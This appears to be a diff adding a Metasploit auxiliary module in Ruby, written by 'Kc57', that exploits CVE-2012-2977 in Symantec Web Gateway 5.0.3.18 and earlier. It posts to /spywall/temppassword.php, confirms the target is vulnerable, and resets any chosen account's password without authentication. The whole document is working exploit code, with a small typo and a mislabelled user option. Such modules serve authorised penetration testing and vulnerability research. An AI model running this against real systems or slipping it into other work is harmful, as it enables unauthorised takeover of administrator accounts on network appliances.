@@ -1,0 +1,93 @@
+##
+# @_Kc57
+# Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info={})
+		super(update_info(info,
+			'Name'           => "Symantec Web Gateway <= 5.0.3.18 Arbitrary Password Change",
+			'Description'    => %q{
+					This module will change the password for the specified account on a Symantec Web Gatewaye server.
+			},
+			'License'        => MSF_LICENSE,
+			'Version'        => "$Revision: 0 $",
+			'Author'         =>
+				[
+					'Kc57',
+				],
+			'References'     =>
+				[
+					[ 'CVE', '2012-2977' ],
+					[ 'OSVDB', '0' ],
+					[ 'BID', '54430' ],
+					[ 'URL', 'http://www.securityfocus.com/bid/54430' ],
+				],
+			'DisclosureDate' => "Jul 23 2012" ))
+
+			register_options(
+				[
+					Opt::RPORT(80),
+					OptString.new('USER', [ true, 'The password to reset to', 'admin']),
+					OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
+				], self.class)
+	end
+
+	def run
+
+		print_status("Attempting to connect to https://#{rhost}/spywall/temppassword.php to reset password")
+		res = send_request_raw(
+		{
+			'method'  => 'POST',
+			'uri'     => '/spywall/temppassword.php',
+		}, 25)
+
+		#check to see if we get HTTP OK
+		if (res.code == 200)
+			print_status("Okay, Got an HTTP 200 (okay) code. Checking if exploitable")
+		else
+			print_error("Did not get HTTP 200, URL was not found. Exiting!")
+			return
+		end
+
+		#Check to if the temppassword.php page loads or if we are redirected to the login page
+		if (res.body.match(/Please Select a New Password/i))
+			print_status("Server is vulnerable!")
+		else
+			print_error("Target doesn't seem to be vulnerable!")
+			return
+		end
+
+		print_status("Attempting to exploit password change vulnerability on #{rhost}")
+		print_status("Attempting to reset #{datastore['USER']} password to #{datastore['PASSWORD']}")
+
+		data  = 'target=executive_summary.php'
+		data << '&USERNAME=' + datastore['USER']
+		data << '&password=' + datastore['PASSWORD']
+		data << '&password2=' + datastore['PASSWORD']
+		data << '&Save=Save'
+
+		res = send_request_cgi(
+		{
+			'method'  => 'POST',
+			'uri'     => '/spywall/temppassword.php',
+			'data'    => data,
+		}, 25)
+
+		if res.code == 200
+			if (res.body.match(/Thank you/i))
+				print_status("Password reset was successful!\n")
+			else
+				print_error("Password reset failed! User '#{datastore['USER']}' may not exist.\n")
+			end
+		else
+			print_error("Password reset failed!")
+		end
+	end
+
+end
